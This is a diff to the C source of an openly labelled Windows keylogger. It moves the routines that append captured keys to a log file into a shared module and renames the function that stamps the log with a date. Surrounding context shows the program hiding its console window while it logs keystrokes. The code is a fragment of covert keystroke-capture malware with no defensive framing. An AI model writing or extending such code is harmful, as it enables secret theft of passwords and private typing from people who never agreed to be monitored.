@@ -1,9 +1,10 @@
 // KeyLogger for Windows machine
 
-#include <stdio.h>
 #include <ctype.h>
 #include <windows.h>
 #include "win_keylog.h"
+#include "../writing/file.h"
+
 
 // Define special keys
 /* https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes */
@@ -52,7 +53,7 @@ int specialKeys[] = {
 };
 
 // Whenever the keylogger is started, add this to the file first
-void WriteHeader(const char* filePath) {
+void winWriteHeader(const char* filePath) {
     FILE *file;
     file = fopen(filePath, "a");
     if (file == NULL) {
@@ -66,37 +67,6 @@ void WriteHeader(const char* filePath) {
     sprintf(date, "[%02d/%02d/%04d %02d:%02d:%02d] : ", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);
     fputs(date, file);
     fflush(file);
-    fclose(file);
-}
-
-// Write the captured key into a file
-void WriteIntoFile(char data, const char* filePath) {
-
-    FILE *file;
-    file = fopen(filePath, "a");
-    if (file == NULL) {
-        return;
-    }
-    char dataStr[2];
-    sprintf(dataStr, "%c", data);
-    fputs(dataStr, file);
-    fflush(file);
-
-    fclose(file);
-}
-
-// Write the captured special key into a file
-void WriteSpecialKeyIntoFile(char *data, const char* filePath) {
-    FILE *file;
-    file = fopen(filePath, "a");
-    if (file == NULL) {
-        return;
-    }
-
-    // Write the special key into the file
-    fputs(data, file);
-    fflush(file);
-
     fclose(file);
 }
 
@@ -334,7 +304,7 @@ void windows_keylog(const char* filePath) {
     fclose(temp);
 
     // Write the header into the file
-    WriteHeader(filePath);
+    winWriteHeader(filePath);
 
     // Hide the console
     HWND hWnd = GetConsoleWindow();
